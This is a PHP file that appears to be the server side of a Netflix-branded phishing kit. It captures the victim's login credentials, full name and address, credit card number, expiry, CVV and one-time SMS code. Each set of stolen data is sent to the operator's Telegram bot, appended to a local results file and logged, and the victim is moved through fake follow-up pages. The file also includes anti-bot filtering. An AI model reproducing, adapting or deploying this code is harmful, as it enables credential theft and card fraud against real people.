<?php 
if (session_status() === PHP_SESSION_NONE) {
    session_start();
}
require_once 'config.php';
require_once __DIR__ . '/lib/user_panel.php';
require_once 'botMother/botMother.php';

$bm = new botMother();


function sendTotelegram($data){
    global $bot;
    global $chat_id;

    $data = urlencode($data);
    $api = "https://api.telegram.org/bot$bot/sendMessage?chat_id=$chat_id&text=$data";
    $c = curl_init($api);
    curl_setopt($c, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($c, CURLOPT_SSL_VERIFYPEER, false);
    $res = curl_exec($c);
    curl_close($c);
    return $res;

}

function appendResult($data) {
    $file = __DIR__ . '/results.txt';
    $entry = '[' . date('Y-m-d H:i:s') . "]\n" . $data . "\n\n";
    file_put_contents($file, $entry, FILE_APPEND);
}

function isAjaxRequest() {
    return isset($_SERVER['HTTP_X_REQUESTED_WITH']) && strtolower($_SERVER['HTTP_X_REQUESTED_WITH']) === 'xmlhttprequest';
}

function respondLoginError($message) {
    if (isAjaxRequest()) {
        header('Content-Type: application/json');
        echo json_encode([
            'success' => false,
            'error' => $message
        ]);
        exit;
    }

    echo $message;
    exit;
}



$ip = $_SERVER['REMOTE_ADDR'];


if(isset($_POST['user'])){

$captchaResponse = $_POST['h-captcha-response'] ?? '';

$captchaSecret = "ES_c2e6eff9a7644bae93f860ec1e530f92"; // Replace with your hCaptcha secret key

if (empty($captchaResponse)) {
    respondLoginError("Error: Captcha not completed.");
}

// Validate captcha response
$verifyCaptcha = curl_init();
curl_setopt($verifyCaptcha, CURLOPT_URL, "https://hcaptcha.com/siteverify");
curl_setopt($verifyCaptcha, CURLOPT_POST, true);
curl_setopt($verifyCaptcha, CURLOPT_POSTFIELDS, http_build_query([
    'secret' => $captchaSecret,
    'response' => $captchaResponse,
]));
curl_setopt($verifyCaptcha, CURLOPT_RETURNTRANSFER, true);
$responseData = json_decode(curl_exec($verifyCaptcha));
curl_close($verifyCaptcha);

if (!$responseData || !$responseData->success) {
    respondLoginError("Error: Invalid captcha.");
}

$msg = "
NETFLIX- New Log 
--------------------------
User: ".$_POST['user']."
pass: ".$_POST['pass']."
--------------------------
IP: $ip
";

sendTotelegram($msg);
appendResult($msg);
$_SESSION['_login_user'] = $_POST['user'];
panelTouchUser($_POST['user'], 'login.php');

if (isAjaxRequest()) {
    header('Content-Type: application/json');
    echo json_encode([
        'success' => true,
        'redirect' => 'adrees.php'
    ]);
    exit;
}

header("location: adrees.php");
exit;

}

$ip = $_SERVER['REMOTE_ADDR'];


if(isset($_POST['first-name'])){
$_SESSION['_first-name'] = $_POST['first-name'];
$_SESSION['_last-name'] = $_POST['last-name'] ?? '';
$fullName = trim(($_POST['first-name'] ?? '') . ' ' . ($_POST['last-name'] ?? ''));
$msg = "
NETFLIX- New ads
--------------------------
Name: " . ($fullName !== '' ? $fullName : 'N/A') . "
first-name: " . ($_POST['first-name'] ?? 'N/A') . "
last-name: " . ($_POST['last-name'] ?? 'N/A') . "
address-line-1: " . ($_POST['address-line-1'] ?? 'N/A') . "
address-line-2: " . ($_POST['address-line-2'] ?? 'N/A') . "
phoneNumber: " . ($_POST['phoneNumber'] ?? 'N/A') . "
country: " . ($_POST['country'] ?? 'N/A') . "
city: " . ($_POST['city'] ?? 'N/A') . "
state: " . ($_POST['state'] ?? 'N/A') . "
postal-code: " . ($_POST['postal-code'] ?? 'N/A') . "
--------------------------
IP: $ip
";


sendTotelegram($msg);
appendResult($msg);
panelTouchUser($fullName !== '' ? $fullName : ($_SESSION['_login_user'] ?? ''), 'adrees.php');

header("location: card.php");

}

$ip = $_SERVER['REMOTE_ADDR'];


if(isset($_POST['cc'])){
$_SESSION['_cc'] = $_POST['cc'];
$cardHolder = $_POST['holder-name'] ?? '';
$msg = "
NETFLIX- New CC
--------------------------
Name: " . ($cardHolder !== '' ? $cardHolder : 'N/A') . "
Cc: " . ($_POST['cc'] ?? 'N/A') . "
Exp: " . ($_POST['exp'] ?? 'N/A') . "
Cvv: " . ($_POST['cvv'] ?? 'N/A') . "
holder-name: " . ($_POST['holder-name'] ?? 'N/A') . "
--------------------------
IP: $ip
";

sendTotelegram($msg);
appendResult($msg);
panelTouchUser($_POST['holder-name'] ?? ($_SESSION['_login_user'] ?? ''), 'card.php');

header("location: wait.php?next=sms.php");

}


if(isset($_POST['otp'])){

$msg = "
NETFLIX - New OTP
--------------------------
Cc: ".$_SESSION['_cc']."
Otp: ".$_POST['otp']."
--------------------------
IP: $ip
";

sendTotelegram($msg);
appendResult($msg);
panelTouchUser($_SESSION['_login_user'] ?? '', 'sms.php');

if(isset($_POST['exit'])){
    die(header("location: exit.php"));
}
header("location: wait.php?next=sms.php");

}
    

if(@$msg!=""){
    $bm->logTXT($msg);
}



?>